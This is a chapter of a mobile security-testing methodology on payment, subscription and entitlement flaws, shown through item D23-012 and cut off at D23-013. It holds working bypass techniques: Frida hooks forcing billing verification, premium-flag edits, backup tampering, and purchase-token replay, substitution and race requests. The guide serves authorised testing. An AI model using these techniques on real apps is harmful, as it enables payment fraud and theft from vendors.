# D23 · Payments, Entitlements, Subscriptions & Fraud

> This is the domain where a mobile engagement stops being a client-side review and becomes a money
> finding. Nothing in this chapter is rated by the mobile branch of the VRT — the flipped
> `SharedPreferences` boolean is `insecure_data_storage|sensitive_application_data_stored_unencrypted|on_internal_storage`
> (**P5**) and the Frida hook is `lack_of_binary_hardening|runtime_instrumentation_based` (**P5**) — and
> every item here is written to reach the *server*. The ceiling is **P1**: a live PSP secret key in the
> package (`sensitive_data_exposure|disclosure_of_secrets|for_publicly_accessible_asset`), a purchase
> token or saved-card token redeemable against another account
> (`broken_access_control|idor|modify_view_sensitive_information_iterable_object_identifiers`), or a
> transaction executed with no genuine authorisation
> (`broken_authentication_and_session_management|authentication_bypass`). Everything short of a server-
> side ledger effect belongs in the graveyard table at the end.

| | |
|---|---|
| **Phases** | **P6 dynamic/business-logic** (entitlement grant path, receipt verification on the wire, checkout and ledger tampering, races, incentive reuse, payment hand-off and callback), with a **P4 static** preparation pass (billing call sites, entitlement storage keys, PSP keys, limits and thresholds read out of the decompile) and **P7 write-up** (ledger arithmetic, chain filing, RoE-safe evidence) |
| **Milestones** | **M6** primary (server-side trust of client-asserted money and entitlement state); **M7** for the chain/report items; M3 harness dependency (an authenticated, decrypted proxy and a KYC/funded account are preconditions for most of the chapter) |
| **VRT ceiling** | **P1** — `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (a live PSP secret key extracted from the package), `broken_access_control\|idor\|modify_view_sensitive_information_iterable_object_identifiers` (a receipt/instrument token redeemable across accounts), `broken_authentication_and_session_management\|authentication_bypass` (a money-moving action completed with no valid authorisation). The working majority of this chapter files as `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) or `server_security_misconfiguration\|race_condition` (**VARIES**) and is rated on the demonstrated ledger delta — **the VRT has no billing node, so the number you get is the number you argue for** |
| **Primary attacker model** | **AM-01 remote no interaction** for everything that is an authenticated API call the attacker makes against their own account (price, coupon, receipt replay, races) and **AM-05 another user of the same app** for cross-account token redemption; **AM-02 remote one click** for forged payment callbacks and payment deep links; **AM-03/AM-04** for exported entitlement surfaces and billing-proxy apps; **AM-08** for a payment SDK's own defects. **AM-12 (your own rooted device) is not an attacker model** — a premium feature unlocked only in your own UI is a P5 and belongs in the graveyard |
| **Maps to** | MASVS-AUTH-1, MASVS-RESILIENCE-2, MASVS-RESILIENCE-3, MASVS-PLATFORM; MASTG-TEST-0338, MASTG-TEST-0368, MASTG-TEST-0327, MASTG-TEST-0340; MASTG-TECH-0008, -0009, -0010, -0011, -0043; MASTG-KNOW-0036; MASTG-BEST-0066; MASWE-0004, -0009, -0011, -0018, -0023, -0025, -0039, -0040, -0050, -0057, -0059; CWE-471, CWE-862, CWE-798, CWE-693, CWE-269, CWE-347, CWE-927; ATT&CK **T1641** Data Manipulation, **T1641.001** Transmitted Data Manipulation, **T1643** Generate Traffic from Victim, **T1516** Input Injection (detection DET0612/AN1666), T1417.002, T1453, T1582, T1616, T1660; OWASP API Top 10 **API3:2023**, **API5:2023**, **API6:2023**; OWASP WSTG **WSTG-BUSL-02**, **-03**, **-05**, **-06**; Mobile Top 10 2024 **M3/M7**; CVE-2025-12080 (intent injection reaching a billable action) |

## Why this domain pays

It pays because it is the only mobile domain where the impact statement writes itself. Everything else in
a mobile report has to be argued into a severity band; a payment finding arrives with an arithmetic figure
attached. Cobalt's Patricio Castagnaro puts the consultancy version bluntly for financial clients: *"we
don't care about the platform protections … we want to focus on the business logic. Why? Because we are
moving money, or we are banking."* Grab's reward philosophy says the same thing from the programme side —
they pay for demonstrated business consequence and explicitly ask researchers to "spend extra time to
provide a realistic attack/threat scenario adapted to our business". Reddit's policy is the sharpest
formulation of the rule this chapter operates under: *"We generally do not accept logic bugs unless they
result in the disclosure of security information or financial data, escalate privileges, or cause
disruption to our services."* Xiaomi's Critical band is literally "vulnerabilities that could cause
significant financial loss to users."

The base rates that exist are modest but real, and they cluster in exactly two shapes. The incentive
shape: Uber paid **$3,000** for promotion-code enumeration and brute force in a mobile app (H1 #125707),
still one of the better-paid mobile business-logic findings on record; a fee discount redeemable many
times paid **$5,000** (H1 #1849626); repeated gift-card redemption is a named race-condition precedent
(H1 #759247). The money-movement shape: Razer paid **$1,000** each for two chained defects that let a
third party steal "RedPacket" money (H1 #753280, #757095) and **$500** for the IDOR on the same feature's
logs (#754044); double payout via mishandled payment-provider transaction states — withdrawing money
without the funds being deducted — paid **$10,000** (H1 #307239); modifying in-flight data to a payment
provider to generate wallet balance paid **$7,500** (H1 #1295844); cross-user parameter tampering in
billing/subscription paid **$8,000** (H1 #394329). Wallet-prompt attribution — a confirmation dialog
naming a counterparty that is not the one who will actually be paid — rated **High 7.1** at MetaMask
(H1 #1751333). A payment sent by QR with no confirmation screen at all is H1 #126784.

Be honest about the half of the domain that is a graveyard. **In-app purchase bypass on your own device
is not a finding on most programmes**, and several exclude it by name. The Frostynxth paywall analysis is
the archetype of the thing that looks like a win and is not: lifetime purchase, monthly, yearly, purchase
history and `SharedPreferences` all checked, and "all occurred locally without server verification" — a
complete local unlock that costs the vendor nothing beyond one pirated install, because the paid assets
were already in the APK. The finding only exists when the *server* honours the client's claim: a premium
endpoint returning gated content under a free account's token, an entitlement that survives a fresh
install and login on a second device, a balance that moved. That distinction is the whole chapter. The
MASTG concedes the point structurally — **there is no Android MASTG-TEST for purchase validation,
subscription state or fraud**, so the identifiers in this chapter are borrowed (MASTG-TEST-0338 for the
storage-integrity attack scenario, which is literally "resets a trial counter or flips a 'premium' flag";
MASTG-TEST-0368 for the recoverable fraud threshold) and the rest is business-logic craft.

## The crux question

**Does any monetary or entitlement decision in this app get made anywhere other than the vendor's own
server — and where the server does decide, does it independently re-derive the amount, the payer identity
and the uniqueness of the receipt, or does it echo what the client sent?**

## Triage order

1. **Provisioning first: a funded/KYC account and a second account of the same role.** Almost every item
   below is untestable without them, and refusal is a named coverage limitation rather than a clean
   result. Get the payments RoE in writing at the same time (real card? real settlement? sandbox PSP
   keys?) — default is no.
2. **Static sweep for a PSP *secret* key.** It is the only deterministic P1 in the chapter, it takes two
   minutes, and one read-only call settles it.
3. **Find the entitlement grant path on the wire.** Does a `purchaseToken` ever leave the device for the
   vendor's backend? The absence of that request is the single highest-signal observation in the domain.
4. **Receipt uniqueness and account binding.** Replay the token to the same account, then to a second
   account. One purchase entitling two accounts is the best-shaped billing finding there is.
5. **Client-supplied money fields at checkout.** Price, total, discount, currency, quantity, credits.
   Cheap, mechanical, and Critical when accepted.
6. **The state machine, not the fields.** Step-skip, reversal, webhook replay, callback forgery. Scanners
   cannot find these and neither can anyone who only fuzzes parameters.
7. **One-time incentives, sequentially before concurrently.** Ten sequential redemptions first: if they
   all succeed it is a logic bug, not a race, and the framing and the fix differ.
8. **Races last, and only with a ledger read-back.** N×200 is not a finding; a balance is.
9. **Local entitlement flips and Frida hooks at the very end** — and only to answer "does the server
   honour this?". If the answer is no, they are ruled-out entries, not findings.

## Items

### D23-001 · Build the monetisation map before touching anything

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (it decides which of the other 60 items exist in this app) |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | WSTG-BUSL-03 Test Integrity Checks (the inventory it presumes); MASVS-AUTH-1 |

- **Test:** Enumerate every place the app makes or reports a money/entitlement decision, and for each one
  record **who decides** — the device, the store, the PSP, or the vendor's own backend. Everything that
  follows is a test of one row in this table.
- **How:** One static sweep, one proxy sweep, one table.
```bash
S=jadx_out/sources
# 1. billing / entitlement decision points
grep -rnE 'BillingClient|PurchasesUpdatedListener|queryPurchasesAsync|acknowledgePurchase|consumeAsync|verifyPurchase|getOriginalJson|getSignature\(\)|base64EncodedPublicKey|BASE64_PUBLIC_KEY' $S
grep -rniE 'isPremium|isPro|isSubscribed|hasSubscription|hasPurchased|entitlement|unlockFeature|tier|plan\b|paywall' $S
# 2. money fields the client can name
grep -rnoE '"(amount|total|price|subtotal|grandTotal|finalCustomerAmount|creditsToDeduct|discount|couponValue|
finalPrice|currency|qty|quantity|points|balance|fee|tip|shipping)"' $S | sort | uniq -c | sort -rn | head -40
# 3. PSP / wallet SDKs present
grep -rniE 'stripe|braintree|adyen|razorpay|payu|checkout\.com|cashfree|juspay|paypal|worldpay|PaymentsClient|
Wallet\.getPaymentsClient|HostApduService|upi://|CardEmulation' $S AndroidManifest.xml
# 4. the wire: which host settles money, which merely reports it
mitmdump -nr traffic.flows -s /dev/stdin <<'PY'
def response(f):
    b=(f.response.content or b'')[:4000].lower()
    if any(k in b for k in (b'entitle',b'premium',b'subscri',b'purchase',b'order',b'wallet',b'balance',b'coupon')):
        print(f.request.method, f.request.pretty_host, f.request.path[:90], f.response.status_code)
PY
```
  Fill one row per decision: `surface | request | field that carries the decision | who decides | re-derived server-side? | item numbers to run`.
- **Proof:** The completed table, with the "who decides" column answered from *evidence* (a captured
  request, or its documented absence) rather than from the code's intent.
- **Escalation:** The table is the input to D15 (every row is a business-logic test) and to D27 (it is the
  coverage statement that makes your negatives defensible).
- **Ruled out when:** Never — this item produces an artefact, not a verdict. If a row's "who decides"
  column cannot be answered, that row goes on the blocked register with the reason, not into the clean
  column.

### D23-002 · Purchase signature verified on the device with a key shipped in the APK

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); the embedded key itself is `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**, CWE-347) |
| **Attacker** | AM-12 to discover, AM-01 to exploit once the forged receipt is accepted by the backend |
| **Applies to** | any app with Google Play Billing or a custom receipt flow |
| **Maps to** | MASWE-0011 (Improper Verification of Cryptographic Signature), MASWE-0004 (hardcoded key), MASWE-0050, MASWE-0057 (CWE-471); MASTG-TECH-0043; MASVS-AUTH-1; Google Play Billing security guidance — **"Do not verify signatures on the device"**; Google ASI campaign *Google Play Billing interception* (started 2016-07-28, `faqs/answer/7054270`) |

- **Test:** The single most common billing defect. The app RSA-verifies the purchase payload against a
  base64 public key compiled into the APK and grants the entitlement from that verdict alone. An embedded
  verification key is a forgery oracle, not a control: whoever holds the corresponding *private* key is
  Google, but whoever controls the client controls the verifier.
- **How:**
```bash
S=jadx_out/sources
grep -rnE 'Signature\.getInstance\("SHA1withRSA"|verifyPurchase|Security\.verify|BASE64_PUBLIC_KEY|
base64EncodedPublicKey|getOriginalJson|getSignature\(\)|INAPP_PURCHASE_DATA|INAPP_DATA_SIGNATURE' $S -B6 -A10
# is a server ever consulted on the same code path?
frida-trace -U -f com.target.app -j 'okhttp3.Request$Builder!url'
```
  Then force the verdict and watch the network, not the UI:
```javascript
Java.perform(function () {
  var S = Java.use('com.target.app.billing.Security');          // the class the grep found
  S.verifyPurchase.implementation = function (pk, data, sig) { console.log('[billing] forced true'); return true; };
  var P = Java.use('com.android.billingclient.api.Purchase');
  P.getPurchaseState.implementation = function () { return 1; };  // PURCHASED
  P.isAcknowledged.implementation  = function () { return true; };
  var J = Java.use('java.security.Signature');                   // belt and braces
  J.verify.overload('[B').implementation = function (s) { this.verify(s); return true; };
});
```
- **Proof:** The entitlement granted with **no corresponding verification request in the proxy log**. The
  absence of an outbound call carrying `purchaseToken` is the evidence — screenshot the proxy history
  filtered to the app's own hosts across the whole purchase flow, and quote the `file:line` of the local
  verifier next to the base64 key.
- **Escalation:** -> D23-005 (does the backend honour the resulting state?), -> D12/D18 for the embedded
  key as a finding in its own right, -> D21 for "nothing detected the hook", which is what makes this
  automatable rather than a one-off.
- **Ruled out when:** The purchase flow emits a request to a **first-party** host carrying the
  `purchaseToken`, and blocking that request (drop it at the proxy) leaves the entitlement ungranted.
  That is the server-verified model working: record the request, the drop, and the ungranted state.

### D23-003 · Entitlement granted from a local flag with no server round-trip

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-12 locally; the reportable form is AM-01 once the server accepts it |
| **Applies to** | all apps with paid tiers, trials, quotas or role flags |
| **Maps to** | **MASTG-TEST-0338** (References to Storage Integrity Check APIs — its own attack scenario is "resets a trial counter or flips a 'premium' flag"), MASWE-0057 (CWE-471), MASTG-KNOW-0036, MASTG-BEST-0066, MASTG-TECH-0008; MASVS-RESILIENCE-2; Mobile Top 10 2024 M7/M3 |

- **Test:** Find the storage key that decides the gate, flip it, restart cold, and then make a
  *server* call that should be refused to a free account.
- **How:**
```bash
P=com.target.app
adb shell "run-as $P cat /data/data/$P/shared_prefs/*.xml" | grep -iE 'premium|pro|paid|trial|subscri|entitle|tier|role|expiry|until'
adb shell "run-as $P ls -R /data/data/$P/files /data/data/$P/databases"      # MMKV / DataStore / SQLite
adb shell "run-as $P sed -i 's/\"is_premium\" value=\"false\"/\"is_premium\" value=\"true\"/' /data/data/$P/shared_prefs/settings.xml"
adb shell "run-as $P sqlite3 /data/data/$P/databases/app.db 'UPDATE entitlements SET active=1;'"
adb shell am force-stop $P && adb shell monkey -p $P 1
```
  MMKV and DataStore are not XML — dump and patch them as binary, or hook the accessor instead:
```
android hooking search '*!*isPremium*'
android hooking set return_value "com.target.app.billing.EntitlementManager.isSubscribed" true
android heap search instances com.target.app.billing.EntitlementManager
android heap print fields <hashcode>
```
- **Proof:** Two artefacts, and the second one is the finding: (1) the paid UI unlocked after the edit;
  (2) **a premium-only API returning 200 with the gated payload**, replayed with `curl` outside the app
  under the free account's token. If only (1) exists, this is not a report.
- **Escalation:** -> D11 for the non-root persistence route (D23-004), -> D15 if the same flag is also
  *sent* to the server and accepted, which converts it into mass assignment.
- **Ruled out when:** After the local flip, the premium endpoint returns 403/402 and the app's own next
  sync resets the flag from the server's answer. Capture the sync response showing `premium:false`
  overwriting your edit — that is a server-authoritative entitlement and a clean negative.

### D23-004 · The non-root route to the entitlement store: modify-and-restore backup

| | |
|---|---|
| **Severity ceiling** | High (Medium in the common case; High when this is the only route to the flip and the server honours the result) |
| **VRT** | `mobile_security_misconfiguration\|auto_backup_allowed_by_default` (**P5**) for the enabler; rate on the consequence via `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-11 physical unlocked; AM-12 for convenience |
| **Applies to** | `android:allowBackup="true"` (the default) and `≤ Android 11`; **`[DEGRADED]` on Android 12+**, where `adb backup` no longer covers app data for non-debuggable apps — say so rather than claiming a universal route |
| **Maps to** | MASTG-TECH-0008; MASWE-0057; `insecure_data_storage\|sensitive_application_data_stored_unencrypted\|on_internal_storage` (P5) for the store itself |

- **Test:** The value of this item is not the flip — it is removing root from the PoC. A triager who sees
  `adb root` discounts the finding; a triager who sees a stock, unrooted device does not.
- **How:**
```bash
grep -n 'allowBackup\|fullBackupContent\|dataExtractionRules\|backupAgent' out/AndroidManifest.xml
adb backup -f ent.ab -noapk com.target.app
java -jar abe.jar unpack ent.ab ent.tar          # or: unpack-kk for older formats
tar xf ent.tar && vi apps/com.target.app/sp/settings.xml     # flip the entitlement boolean
star -c -no-dirslash -f new.tar apps/           # preserve the exact member layout
java -jar abe.jar pack-kk new.tar new.ab
adb restore new.ab && adb shell am force-stop com.target.app
```
- **Proof:** The entitlement active on a **stock, unrooted, non-debuggable device**, with the `adb backup`
  and `adb restore` transcript, followed by the same server-side premium call that proves D23-003.
- **Escalation:** -> D11 (the backup surface generally), -> D23-003. Also test whether a *remote-config*
  key such as an API host is in the same backup set: a restore that rewrites the API host for every
  request is a separate Medium–High finding and it only exists by reading the backup agent and the
  config-read path together.
- **Ruled out when:** `allowBackup="false"`, or the entitlement key is excluded by `dataExtractionRules`
  / `fullBackupContent`, or the device is Android 12+ and `adb backup` returns an empty archive for the
  package. Show the empty/`0`-byte archive, not the manifest attribute alone.

### D23-005 · The two-half rule: does the backend honour the state the client claims?

| | |
|---|---|
| **Severity ceiling** | Critical (when the gated content is other users' data or a balance), otherwise High |
| **VRT** | `broken_access_control\|idor\|modify_view_sensitive_information_iterable_object_identifiers` (**P1**) when premium gates other users' data; `broken_access_control\|privilege_escalation` (**VARIES**) for the revenue case |
| **Attacker** | AM-01 |
| **Applies to** | all freemium/subscription apps |
| **Maps to** | API5:2023 Broken Function Level Authorization, API3:2023; MASWE-0018 (CWE-862); MASVS-AUTH-1; H1 #175490 (Shopify — the *server* accepted the state the client claimed) is the nearest disclosed calibration point |

- **Test:** Every local-unlock item in this chapter terminates here. Strip the app out of the loop
  entirely and make the request yourself with a free account's token.
- **How:**
```bash
# 1. the header/body/JWT-claim variant: assert the tier
curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v1/premium/export \
  -H "Authorization: Bearer $FREE_TOKEN" -H 'Content-Type: application/json' \
  -H 'X-Tier: PREMIUM' -d '{"isPremium":true,"tier":"pro"}'
# 2. the plain variant: call the gated route with nothing added
curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v1/premium/export -H "Authorization: Bearer $FREE_TOKEN"
# 3. the durability test that decides the severity
adb uninstall com.target.app && adb install base.apk     # clean install, log in on a second device
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $FREE_TOKEN" | jq .
```
- **Proof:** A gated payload returned to a free account's token from `curl` — not from the app. Pair it
  with the negative control: the same request under a second free account's token that has *not* been
  tampered with, returning 402/403. The delta is the finding.
- **Escalation:** -> D15 if the tier lives in a JWT claim the client can mint (then it is universal, not
  per-device); -> D13 if the claim is in a token you can forge outright.
- **Ruled out when:** Both (1) and (2) return the gating status and the response body is **byte-identical**
  to the untampered control after normalisation. A 200 with an empty or identical body is not a bypass —
  diff it before you write anything.

### D23-006 · `purchaseToken` replayed to the same account (idempotency)

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); the concurrent variant is `server_security_misconfiguration\|race_condition` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | any app whose backend accepts a client-supplied receipt |
| **Maps to** | Google Play Billing security guidance — the documented flow requires the backend to "maintain a record of all `purchaseToken` values" and reject a repeat; MASWE-0009 (missing replay protection); WSTG-BUSL-02 Test Ability to Forge Requests |

- **Test:** Buy one consumable or subscription with your own test account, capture the verification call,
  then submit the identical body again — sequentially, then 30× in parallel.
- **How:**
```bash
T=$(cat token.txt); TOK='<captured purchaseToken>'
# sequential — is the grant idempotent?
for i in 1 2 3; do curl -s -o /dev/null -w "%{http_code} " -X POST https://api.target/v1/billing/verify \
  -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d "{\"purchaseToken\":\"$TOK\",\"productId\":\"premium_monthly\"}"; done; echo
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $T" | jq '.credits,.expiresAt'
# concurrent — defeat a "mark as consumed" check that has no lock
seq 1 30 | xargs -P30 -I{} curl -s -o /dev/null -w '%{http_code}\n' -X POST https://api.target/v1/billing/verify \
  -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  -d "{\"purchaseToken\":\"$TOK\",\"productId\":\"premium_monthly\"}" | sort | uniq -c
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $T" | jq '.credits,.expiresAt'
```
  For the concurrent run prefer Burp's **Send group in parallel (single-packet attack)** or a Turbo
  Intruder gate — the spread matters (see D23-045).
- **Proof:** The **ledger delta**, before and after: credits incremented N times, or the subscription
  period stacked N×. N×200 with an unchanged balance is not a finding.
- **Escalation:** -> D23-007 (the same token under a second account is the bigger finding), -> D15 race
  battery.
- **Ruled out when:** The second and subsequent submissions return a distinct "already redeemed" error
  **and** the entitlement read-back is unchanged; the parallel run produces exactly one success. Record
  the status distribution and the two balance reads.

### D23-007 · `purchaseToken` redeemed against a second account (uniqueness and binding)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|idor\|modify_view_sensitive_information_iterable_object_identifiers` (**P1**) — the token is an object identifier being redeemed outside its owner |
| **Attacker** | AM-05 another user of the same app |
| **Applies to** | any app with Play Billing or a receipt-based entitlement |
| **Maps to** | Google Play Billing security guidance (send token to backend → verify uniqueness → call the Developer API → check `obfuscatedAccountId` → grant only if `PURCHASED`); `Purchases.products:get`, `Purchases.subscriptionsv2:get`; API3:2023 |

- **Test:** One legitimate purchase entitling unlimited accounts. This is the shape that turns a billing
  bug into a resale market, and it is the one to lead the report with.
- **How:**
```bash
curl -i -X POST https://api.target/v1/billing/verify \
  -H "Authorization: Bearer $TOKEN_B" -H 'Content-Type: application/json' \
  -d "{\"purchaseToken\":\"$TOK_BOUGHT_BY_A\",\"productId\":\"premium_monthly\"}"
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $TOKEN_B" | jq .
# and the inverse control: a token that never existed
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $TOKEN_B" \
  -d '{"purchaseToken":"aaaaaaaaaaaaaaaaaaaaaaaa.AO-J1Ox","productId":"premium_monthly"}'
```
- **Proof:** Account B entitled from account A's single purchase — the `entitlements` read under B's own
  session on a clean install, alongside A's Play order history showing one order. The forged-token control
  returning a rejection proves the endpoint validates *something*, which is what makes the cross-account
  acceptance damning rather than ambiguous.
- **Escalation:** -> D23-008 (`obfuscatedAccountId` absent is the *cause*), -> D23-011 (buy, redeem
  everywhere, then refund). Quantify: one purchase × N accounts × SKU price.
- **Ruled out when:** B's redemption is refused with an account-mismatch error while A's identical
  request succeeds in the same window. Keep both, timestamped — that pair is the positive control for the
  negative.

### D23-008 · `setObfuscatedAccountId()` never called, so the eligibility check cannot exist

| | |
|---|---|
| **Severity ceiling** | High (Medium standalone; High filed as the mechanism behind D23-007) |
| **VRT** | `cryptographic_weakness\|insecure_implementation\|missing_cryptographic_step` (**VARIES**, CWE-325) as the closest honest node; file with D23-007 as the consumer |
| **Attacker** | AM-05 |
| **Applies to** | Play Billing integrations |
| **Maps to** | Google Play Billing security guidance — `setObfuscatedAccountId()`, `setObfuscatedProfileId()` and the eligibility-check step |

- **Test:** The documented fraud signal is that the purchase carries an app-side account identifier the
  backend can compare against the redeeming user. If the setter is never called, the backend has nothing
  to compare and a token bought under any Google account is indistinguishable from any other.
- **How:**
```bash
grep -rnE 'setObfuscatedAccountId|setObfuscatedProfileId|obfuscatedAccountId|obfuscatedExternalAccountId' jadx_out/sources
grep -rn -A15 'BillingFlowParams.newBuilder' jadx_out/sources | grep -iE 'Obfuscated|setProductDetailsParamsList'
```
  Then, if the setter *is* present, check the other half — that the backend actually compares it:
```bash
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $TOKEN_B" \
  -d "{\"purchaseToken\":\"$TOK_A\",\"productId\":\"premium\",\"obfuscatedAccountId\":\"<B's id>\"}"
```
  A backend that accepts the client's *claimed* `obfuscatedAccountId` instead of reading it from Google's
  API response has the control inverted.
- **Proof:** The absence of the setter across the whole decompile (`grep` returning nothing, quoted with
  the command), plus the successful cross-account redemption from D23-007. Or, where the setter exists,
  the request in which the client supplied the value and the server believed it.
- **Escalation:** -> D23-007. On its own this is a missing fraud signal, not an exploit — file it as the
  primitive and reference the consumer's id.
- **Ruled out when:** The setter is present at the purchase call site **and** a cross-account redemption
  with a spoofed `obfuscatedAccountId` is refused, proving the backend takes the value from Google's
  response rather than the client's body.

### D23-009 · SKU substitution: a cheap product's token redeemed for an expensive entitlement

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | any backend that takes both a receipt and a `productId`/`sku` from the client |
| **Maps to** | API3:2023 (property-level trust of a client-supplied `productId`); WSTG-BUSL-03 Test Integrity Checks |

- **Test:** The backend is supposed to read the product from Google's verification response. Many read it
  from the request body and use the token only as a liveness check. Buy the cheapest SKU in the catalogue
  and redeem it as the most expensive.
- **How:**
```bash
# enumerate the catalogue from the client first
grep -rnoE '"(sku|productId|product_id|basePlanId|offerId)"\s*:\s*"[a-z0-9_.\-]+"' jadx_out/sources | sort -u
grep -rnoE '\b(premium|pro|plus|lifetime|annual|monthly|yearly|tier[0-9])[a-z0-9_.\-]*' jadx_out/res/values/*.xml | sort -u
# then substitute
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $T" \
  -d "{\"purchaseToken\":\"$CHEAP_TOKEN\",\"productId\":\"premium_lifetime\"}"
# and the field-removal variants
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $T" \
  -d "{\"purchaseToken\":\"$CHEAP_TOKEN\"}"                      # productId omitted — what defaults?
```
- **Proof:** The entitlements endpoint showing the expensive tier active, with the Play order history
  showing only the cheap purchase. Screenshot both side by side.
- **Escalation:** -> D23-010 (the same request with the signature fields stripped), -> D15 mass assignment
  (often the same result arrives through a different field name such as `plan`, `tier` or `duration`).
- **Ruled out when:** The response names the mismatch (`product mismatch`, `token is for <cheap sku>`) and
  the entitlement read-back shows the cheap tier. That proves the server read the product from Google's
  answer, not from your body.

### D23-010 · Signature / `signedData` fields removed from the verification request

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**, CWE-347) |
| **Attacker** | AM-01 |
| **Applies to** | backends that accept a client-assembled receipt envelope (`signedData` + `signature`) rather than a bare `purchaseToken` |
| **Maps to** | MASWE-0011; Google Play Billing security guidance (server-to-server verification with the Developer API is the only verification that counts) |

- **Test:** If the request carries `signedData`/`signature`, find out whether the server actually uses
  them. Three probes, in order: remove the signature; keep the signature but mutate the signed JSON;
  replace both with values from a different purchase.
- **How:**
```bash
B='{"signedData":"{\"orderId\":\"GPA.1\",\"productId\":\"premium\",\"purchaseState\":0}","signature":"<real>"}'
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $T" -d "$B"           # baseline
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $T" \
  -d '{"signedData":"{\"orderId\":\"GPA.1\",\"productId\":\"premium_lifetime\",\"purchaseState\":0}"}'   # no sig
curl -i -X POST https://api.target/v1/billing/verify -H "Authorization: Bearer $T" \
  -d '{"signedData":"{\"orderId\":\"GPA.1\",\"productId\":\"premium_lifetime\",\"purchaseState\":0}","signature":"AAAA"}'
```
- **Proof:** A 200 and a granted entitlement for a body whose signature is absent, garbage, or valid for
  different content. Include the baseline request so the triager sees what a legitimate one looks like.
- **Escalation:** -> D23-002 if the app also holds the verification key, which is what lets an attacker
  produce a *well-formed* forged envelope rather than merely an unsigned one.
- **Ruled out when:** All three mutated bodies are refused while the byte-identical baseline succeeds in
  the same window. Note the distinct error codes — if every variant returns the same generic 400, check
  D23-057 before concluding, because you may be talking to a parser rather than the verifier.

### D23-011 · Client-side acknowledgement and the three-day auto-refund loop

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 (the attacker is the purchaser) |
| **Applies to** | Play Billing apps that call `acknowledgePurchase` from the client |
| **Maps to** | Google Play Billing security guidance — purchases not acknowledged within three days are auto-refunded, and acknowledgement is to be performed server-side; `Purchases.products:acknowledge`, `Purchases.subscriptions:acknowledge` |

- **Test:** Acknowledge locally, grant locally, and never let the acknowledgement reach Google. The user
  keeps the entitlement and Google refunds the purchase after three days — a free entitlement with an
  automatic refund path that the vendor's reconciliation may never see.
- **How:**
```bash
grep -rnE 'acknowledgePurchase|AcknowledgePurchaseParams|isAcknowledged\(\)|consumeAsync|ConsumeParams' jadx_out/sources -A6
```
  Complete a real purchase with the acknowledgement request dropped at the proxy (or with the device
  offline immediately after `onPurchasesUpdated`), then check the entitlement daily.
- **Proof:** The entitlement active in the app and at the backend on day 0 with the acknowledgement
  dropped, and the Play refund landing on day 3 — screenshot the Play order history showing the refund
  beside the still-active entitlement. **Refund your own test purchases afterwards and say so in the
  report.**
- **Escalation:** -> D23-012 (does a completed refund revoke anything at all?). Combine with D23-007: buy
  once, redeem across N accounts, then let the auto-refund fire.
- **Ruled out when:** The backend acknowledges server-side (the app never calls
  `acknowledgePurchase`), or the entitlement is revoked when the refund settles — verified by re-reading
  `entitlements` after day 3, not by reading the code.

### D23-012 · Refund, chargeback and voided-purchase reconciliation

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | subscription and IAP apps |
| **Maps to** | Google Play `Orders:refund` with `revoke=true` and the **Voided Purchases API**; WSTG-BUSL-06 Circumvention of Work Flows; API6:2023 |

- **Test:** Whether a completed refund or chargeback removes the entitlement, and whether the grant is
  idempotent across a cancel/re-subscribe cycle. The buy–refund–keep loop is repeatable revenue loss.
- **How:** With your own subscription: subscribe -> confirm the entitlement -> refund via Play -> wait out
  the vendor's stated reconciliation window -> re-check.
```bash
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $T" | jq '.active,.expiresAt,.credits'
curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v1/premium/export -H "Authorization: Bearer $T"
# then re-subscribe and look for a duplicated grant
curl -s https://api.target/v1/entitlements -H "Authorization: Bearer $T" | jq '.credits,.expiresAt'
```
- **Proof:** A premium endpoint returning 200 after a settled refund, timestamped against the Play order
  history entry showing the refund — or a re-subscribe that stacks a second period/credit grant on top of
  the first.
- **Escalation:** If the refund also returns credits that were already spent, the loop nets positive and
  the severity is the per-cycle figure × repeatability. -> D23-047 (refund race).
- **Ruled out when:** The entitlement flips inactive within the window the vendor documents, and the
  premium call returns 402/403 afterwards. Consuming the Voided Purchases API is the mechanism; evidence
  it by the revocation, not by asking.

### D23-013 · Trial re-granted after `pm clear`, reinstall or a rotated device identifier

| | |
|---|---|
| **Severity ceiling** | High (Medium for a nominal trial; High where the trial has real per-cycle value or converts to credit) |
